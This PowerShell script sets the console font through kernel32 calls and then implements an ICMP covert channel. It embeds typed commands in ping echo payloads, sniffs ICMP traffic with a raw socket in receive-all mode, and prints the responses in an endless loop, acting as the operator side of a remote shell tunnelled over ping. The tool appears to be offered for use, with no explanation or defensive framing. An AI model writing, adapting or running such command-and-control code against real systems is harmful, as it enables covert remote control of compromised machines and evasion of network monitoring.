Add-Type -AssemblyName  Microsoft.VisualBasic, PresentationCore, PresentationFramework, System.Drawing, System.Windows.Forms, WindowsBase, WindowsFormsIntegration, System; Add-Type -TypeDefinition 'namespace Windows.Native{using System;using System.ComponentModel;using System.IO;using System.Runtime.InteropServices;public class Kernel32{public const uint FILE_SHARE_READ = 1;public const uint FILE_SHARE_WRITE = 2;public const uint GENERIC_READ = 0x80000000;public const uint GENERIC_WRITE = 0x40000000;public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);public const int STD_ERROR_HANDLE = -12;public const int STD_INPUT_HANDLE = -10;public const int STD_OUTPUT_HANDLE = -11;[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]public class CONSOLE_FONT_INFOEX{private int cbSize;public CONSOLE_FONT_INFOEX(){this.cbSize = Marshal.SizeOf(typeof(CONSOLE_FONT_INFOEX));}public int FontIndex;public short FontWidth;public short FontHeight;public int FontFamily;public int FontWeight;[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]public string FaceName;}public class Handles{public static readonly IntPtr StdIn = GetStdHandle(STD_INPUT_HANDLE);public static readonly IntPtr StdOut = GetStdHandle(STD_OUTPUT_HANDLE);public static readonly IntPtr StdErr = GetStdHandle(STD_ERROR_HANDLE);}[DllImport("kernel32.dll", SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]public static extern IntPtr CreateFile([MarshalAs(UnmanagedType.LPTStr)] string filename,uint access,uint share,IntPtr securityAttributes, [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,uint flagsAndAttributes,IntPtr templateFile);[DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]public static extern bool GetCurrentConsoleFontEx(IntPtr hConsoleOutput, bool bMaximumWindow, [In, Out] CONSOLE_FONT_INFOEX lpConsoleCurrentFont);[DllImport("kernel32.dll", SetLastError=true)]public static extern IntPtr GetStdHandle(int nStdHandle);[DllImport("kernel32.dll", SetLastError=true)]public static extern bool SetCurrentConsoleFontEx(IntPtr ConsoleOutput, bool MaximumWindow,[In, Out] CONSOLE_FONT_INFOEX ConsoleCurrentFontEx);public static IntPtr CreateFile(string fileName, uint fileAccess, uint fileShare, FileMode creationDisposition){IntPtr hFile = CreateFile(fileName, fileAccess, fileShare, IntPtr.Zero, creationDisposition, 0U, IntPtr.Zero);if (hFile == INVALID_HANDLE_VALUE){throw new Win32Exception();}return hFile;}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);return GetCurrentConsoleFontEx(hFile);}finally{CloseHandle(hFile);}}public static void SetCurrentConsoleFontEx(CONSOLE_FONT_INFOEX cfi){IntPtr hFile = IntPtr.Zero;try{hFile = CreateFile("CONOUT$", GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE, FileMode.Open);SetCurrentConsoleFontEx(hFile, false, cfi);}finally{CloseHandle(hFile);}}public static CONSOLE_FONT_INFOEX GetCurrentConsoleFontEx(IntPtr outputHandle){CONSOLE_FONT_INFOEX cfi = new CONSOLE_FONT_INFOEX();if (!GetCurrentConsoleFontEx(outputHandle, false, cfi)){throw new Win32Exception();}return cfi;}}}'; 
$F = [Windows.Native.Kernel32]::GetCurrentConsoleFontEx(); $F.FontIndex = 0; $F.FontWidth = 6; $F.FontHeight = 12; $F.FontFamily = 54; $F.FontWeight = 1000; $F.FaceName = "SimSun-ExtB"; [Windows.Native.Kernel32]::SetCurrentConsoleFontEx($F)
[char]$EL = 10


#send

  $sc = [System.Net.NetworkInformation.Ping]::new()
  $PingOptions = [System.Net.NetworkInformation.PingOptions]::new()
  $PingOptions.DontFragment = $true


#recieve

  $BindingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[1])
  $SendingIP = ((Get-NetIPAddress | Where-Object { $_.AddressState -eq "Preferred" -and $_.ValidLifetime -lt "24:00:00" }).IPAddress[0])
  $pRs = [System.Net.Sockets.Socket]::new([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::Icmp)
  $pRs.bind([system.net.IPEndPoint]::new([system.net.IPAddress]::Parse($BindingIP), 0))
  $pRs.IOControl([Net.Sockets.IOControlCode]::ReceiveAll, [BitConverter]::GetBytes(1), $null)
  $buffer = New-Object byte[] $pRs.ReceiveBufferSize
  $pRs.ReceiveTimeout = 0

  
$sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes("NewHost" + $EL)), $PingOptions) | Out-Null
$sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes($BindingIP + $EL)), $PingOptions) | Out-Null
$pRs.Receive($buffer);(([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
$pRs.Receive($buffer)

While ($true) {
  Write-Host -NoNewline (([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
  $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes("Com" + $EL)), $PingOptions) | Out-Null
  $inp = $Host.UI.ReadLine();
  $sc.Send([ipaddress]$SendingIP, "20", (([text.encoding]::Ascii).GetBytes($inp + $EL)), $PingOptions) | Out-Null
  $pRs.Receive($buffer);(([System.Text.Encoding]::ASCII.GetString($buffer[28..$pRs.ReceiveBufferSize]) -split $EL)[0].Trim())
  $pRs.Receive($buffer)
}
